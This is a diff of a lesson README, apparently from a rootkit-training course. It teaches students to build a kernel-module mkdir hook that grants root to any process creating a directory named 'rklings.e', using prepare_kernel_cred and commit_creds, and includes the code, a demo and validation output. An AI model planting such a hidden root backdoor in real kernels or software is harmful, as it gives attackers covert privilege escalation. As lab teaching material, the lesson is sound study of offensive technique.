@@ -1,54 +1,94 @@
-# Become root with a single mkdir
+# L06: Mkdir Escalation
 
-You already know how to intercept a mkdir from the kernel.
-Now you will use that interception to do something dangerous: replace the
-calling process's credentials with root credentials.
+You can intercept mkdir.
+Now make it do something an attacker needs: replace the calling process's
+credentials with root.
 
-## The credential API
+## Process credentials
 
-The kernel tracks every process's identity through a `struct cred`.
-Two functions let you replace it:
+Every process carries a `struct cred` holding its uid, gid, and capabilities.
+The kernel checks these on every file access, every syscall, every permission
+decision.
+Replace the cred and the process becomes root.
+
+```c
+struct cred *new_cred = prepare_kernel_cred(&init_task);
+commit_creds(new_cred);
+```
+
+`init_task` is PID 1, the first process the kernel creates.
+It runs with uid 0, gid 0, and full capabilities.
+`prepare_kernel_cred` allocates a new credential structure copied from init's
+credentials.
+`commit_creds` installs that copy on the calling process.
+
+After `commit_creds` returns, the caller is root.
+That is the entire escalation: two function calls.
+
+```text
+  student (uid=1000)                 kernel module
+    |                                     |
+    |  mkdir("rklings.e")                 |
+    |  ---------- mkdir("rklings.e") -->   |
+    |                              RK_ON_MKDIR(name)
+    |                                strcmp "rklings.e" -> match
+    |                                prepare_kernel_cred(&init_task)
+    |                                commit_creds(new_cred)
+    |  <-- process is now uid=0            |
+    |                                     |
+    |  id                                 |
+    |  uid=0(root) gid=0(root)            |
+```
+
+## You write
+
+`main.c` (~40 lines):
+
+- `RK_ON_MKDIR` handler with `strcmp` match on `"rklings.e"`
+- `prepare_kernel_cred(&init_task)` + `commit_creds`
+
+## API
+
+```c
+#include <linux/cred.h>
+#include <linux/sched/task.h>
+
+extern struct task_struct init_task;
+struct cred *prepare_kernel_cred(struct task_struct *ref);
+int commit_creds(struct cred *new);
+
+int strcmp(const char *s1, const char *s2);
+```
+
+## Test it
+
+The module is pre-loaded.
+You log in as student.
 
 ```
-struct cred *new = prepare_kernel_cred(&init_task);
-commit_creds(new);
-```
-
-`prepare_kernel_cred(&init_task)` allocates a new credential structure copied
-from the init process (PID 1, which runs as root).
-`commit_creds(new)` installs those credentials on the calling process.
-
-After `commit_creds` returns, the process that triggered the mkdir is running as
-uid=0.
-
-## What to build
-
-Extend your RK_ON_MKDIR callback:
-- If `name` matches `"rklings.e"`, call `prepare_kernel_cred` and `commit_creds`
-  to escalate the calling process to root
-- Still return `-ENOENT` to prevent the actual directory from being created
-- Non-matching names return `-ENOENT` without escalating
-
-You will need two additional headers: `<linux/cred.h>` for the credential
-functions and `<linux/sched/task.h>` for `init_task`.
-
-## Demo
-
-```
-$ id
-uid=1000(user) gid=1000(user) ...
-$ mkdir rklings.e
+$ rklings run l06
+student@vm:~$ id
+uid=1000(student) gid=1000(student) groups=1000(student)
+student@vm:~$ mkdir rklings.e
 mkdir: cannot create directory 'rklings.e': No such file or directory
-$ id
-uid=0(root) gid=0(root) ...
+student@vm:~$ id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-## Verify
+## Validate
 
 ```
-./rklings check
+$ rklings validate l06
+  [+] module loaded
+  [+] uid=1000 before mkdir
+  [+] mkdir rklings.e
+  [+] uid=0 after mkdir
+  [+] non-matching mkdir does not escalate
+  PASS
 ```
 
-The test loads your module, runs `mkdir rklings.e` as a normal user, then checks
-that the process has uid=0.
-It also verifies that a non-matching mkdir does not change credentials.
+## Next
+
+L06 escalates the process that runs mkdir.
+But sometimes you need to escalate a different process.
+L07 adds deferred PID targeting.
